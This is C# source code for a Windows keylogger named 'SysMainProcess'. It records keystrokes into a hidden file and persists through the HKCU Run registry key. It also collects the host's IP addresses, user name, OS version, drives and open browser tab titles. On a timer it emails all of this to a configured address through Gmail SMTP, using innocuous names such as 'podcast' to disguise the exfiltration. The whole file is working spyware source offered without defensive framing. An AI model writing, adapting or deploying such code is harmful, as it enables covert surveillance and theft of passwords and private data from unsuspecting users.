using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Threading;
using System.Timers;
using Microsoft.Win32;
using System.Windows.Forms;
using System.Diagnostics;
using System.Windows.Automation;

namespace SysMainProcess
{
    partial class SysMainProcess
    {
        #region DECLARATION
        private static string filepath = "";
        private static string path = "";
        private static string lastPath = "";

        private static string logContents = "";

        private static DateTime now = DateTime.Now;
        private static string subject = "";
        private static string podcastContents = "";

        private static string[] drives = new string[0];

        private static bool checkProcess = false;

        private static IPHostEntry host = null;
        private static SmtpClient client = null;
        private static MailMessage podcastMessage = null;

        private static RegistryKey rkProcess = null;

        private static System.Timers.Timer timer = new System.Timers.Timer();

        private static Process[] procs = null;
        private static AutomationElement root = null;
        private static Condition condition = null;
        private static AutomationElementCollection tabs = null;


        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(int i);
        #endregion DECLARATION

        static void Main(string[] args)
        {
            filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            path = (filepath + @"\" + REGISTRY_FILE_NAME);

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path)) { sw.Dispose(); }
            }

            File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden | FileAttributes.NotContentIndexed | FileAttributes.Temporary);

            rkProcess = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rkProcess.SetValue("SysMainProcess", Application.ExecutablePath.ToString());
            
            timer.Interval = PODCAST_INTERVAL;
            timer.Elapsed += new ElapsedEventHandler(SendNewPodcast);
            timer.AutoReset = true;
            timer.Start();

            while (true)
            {
                Thread.Sleep(THREAD_SLEEP_TIME);

                for (int i = MIN_ASCII_CODE; i < MAX_ASCII_CODE; i++)
                {
                    if (GetAsyncKeyState(i) == KS_DETECT)
                    {
                        checkProcess = true;

                        using (StreamWriter sw = File.AppendText(path))
                        {
                            if (i == 13)
                            {
                                Console.WriteLine((char)i);
                                sw.WriteLine((char)i);
                            }
                            else
                            {
                                Console.Write((char)i);
                                sw.Write((char)i);
                            }

                            sw.Dispose();
                        }
                    }
                }
            }
        }

        #region METHODS
        static void CheckUrl()
        {
            try
            {
                if (Process.GetProcessesByName("chrome").Length <= 0)
                {
                    if(Process.GetProcessesByName("opera").Length <= 0)
                    {
                        if (Process.GetProcessesByName("firefox").Length <= 0)
                        {
                            if (Process.GetProcessesByName("MicrosoftEdge").Length <= 0)
                            {
                                procs = Process.GetProcessesByName("anywayGHgdhghdhjgdhjkghdahjgduyo");
                                podcastContents += "\n Browser: Browser is not running.";
                            }
                            else
                            {
                                procs = Process.GetProcessesByName("MicrosoftEdge");
                                podcastContents += "\n Browser: Microsoft Edge";
                            }
                        }
                        else
                        {
                            procs = Process.GetProcessesByName("firefox");
                            podcastContents += "\n Browser: Firefox";
                        }
                    }
                    else
                    {
                        procs = Process.GetProcessesByName("opera");
                        podcastContents += "\n Browser: Opera GX";
                    }
                    
                }
                else
                {
                    procs = Process.GetProcessesByName("chrome");
                    podcastContents += "\n Browser: Chrome";
                }
               

                if (procs.Length > 0)
                {
                    foreach (Process proc in procs)
                    {
                        if (proc.MainWindowHandle == IntPtr.Zero)
                        {
                            continue;
                        }

                        root = AutomationElement.FromHandle(proc.MainWindowHandle);
                        condition = new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.TabItem);

                        tabs = root.FindAll(TreeScope.Descendants, condition);

                        foreach (AutomationElement tabitem in tabs)
                        {
                            podcastContents += "\n Open Tab: " + tabitem.Current.Name;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                ex.ToString();
            }
        }
        static void EraseFileContents()
        {
            if (File.Exists(path))
            {
                File.Delete(path);
            }
            using (StreamWriter sw = File.CreateText(path))
            {
                sw.Dispose();
            }

            File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden | FileAttributes.NotContentIndexed | FileAttributes.Temporary);
        }
        static void SendNewPodcast(object source, ElapsedEventArgs e)
        {
            if(checkProcess)
            {
                lastPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\" + REGISTRY_FILE_NAME;

                logContents = File.ReadAllText(lastPath);

                CreatePodcast();

                EstablishNetworkConnectivity();

                client.Send(podcastMessage);

                now = DateTime.Now;
                podcastContents = "";
                logContents = "";
                subject = "";

                host = null;
                client.Dispose();
                client = null;
                podcastMessage = null;

                checkProcess = false;
                drives = new string[0];

                EraseFileContents();
            }
        }
        static void CreatePodcast()
        {
            host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (IPAddress address in host.AddressList)
            {
                podcastContents += "Address: " + address + " | ";
            }

            now = DateTime.Now;

            subject = "Message from SysMain " + host.HostName;
            podcastContents += "\n Time: " + now.ToString();

            podcastContents += "\n";

            podcastContents += "\n User: " + Environment.UserDomainName + " || User Name: " + Environment.UserName;
            podcastContents += "\n Host: " + host.HostName;
            podcastContents += "\n OS Version: " + Environment.OSVersion;
            podcastContents += "\n Processor Cores Count: " + Environment.ProcessorCount;

            drives = Environment.GetLogicalDrives();
            for (int i = 0; i < drives.Length; i++)
            {
                podcastContents += "\n Logical Drive(" + i + "): " + drives[i];
            }

            podcastContents += "\n";    

            CheckUrl();

            podcastContents += "\n";

            podcastContents += "\n Content: \n" + logContents;
        }
        static void EstablishNetworkConnectivity()
        {
            client = new SmtpClient("smtp.gmail.com", SMTP_PORT)
            {
                EnableSsl = true,
                UseDefaultCredentials = false,
                Credentials = new NetworkCredential(PODCAST_EMISSOR_CREDENTIALS[0], PODCAST_EMISSOR_CREDENTIALS[1])
            };

            podcastMessage = new MailMessage();

            podcastMessage.From = new MailAddress(PODCAST_EMISSOR_CREDENTIALS[0]);
            podcastMessage.To.Add(PODCAST_RECEIVER);
            podcastMessage.Subject = subject;
            podcastMessage.Body = podcastContents;
        }
        #endregion METHODS
    }
}

/* ▄▀▀▄ █  ▄▀▀▀▀▄  ▄▀▀▀▀▄          ▄▀▀▀▀▄   ▄▀▀▀█▄        ▄▀▀▀█▀▀▄  ▄▀▀▄ ▄▄   ▄▀▀█▄▄▄▄      ▄▀▀█▄▄   ▄▀▀█▄▄▄▄  ▄▀▀█▄   ▄▀▀█▄▄  
█  █ ▄▀ █ █   ▐ █    █          █      █ █  ▄▀  ▀▄     █    █  ▐ █  █   ▄▀ ▐  ▄▀   ▐     █ ▄▀   █ ▐  ▄▀   ▐ ▐ ▄▀ ▀▄ █ ▄▀   █ 
▐  █▀▄     ▀▄   ▐    █          █      █ ▐ █▄▄▄▄       ▐   █     ▐  █▄▄▄█    █▄▄▄▄▄      ▐ █    █   █▄▄▄▄▄    █▄▄▄█ ▐ █    █ 
  █   █ ▀▄   █      █           ▀▄    ▄▀  █    ▐          █         █   █    █    ▌        █    █   █    ▌   ▄▀   █   █    █ 
▄▀   █   █▀▀▀     ▄▀▄▄▄▄▄▄▀       ▀▀▀▀    █             ▄▀         ▄▀  ▄▀   ▄▀▄▄▄▄        ▄▀▄▄▄▄▀  ▄▀▄▄▄▄   █   ▄▀   ▄▀▄▄▄▄▀ 
█    ▐   ▐        █                      █             █          █   █     █    ▐       █     ▐   █    ▐   ▐   ▐   █     ▐  
▐                 ▐                      ▐             ▐          ▐   ▐     ▐            ▐         ▐                ▐         by  Anonymous user*/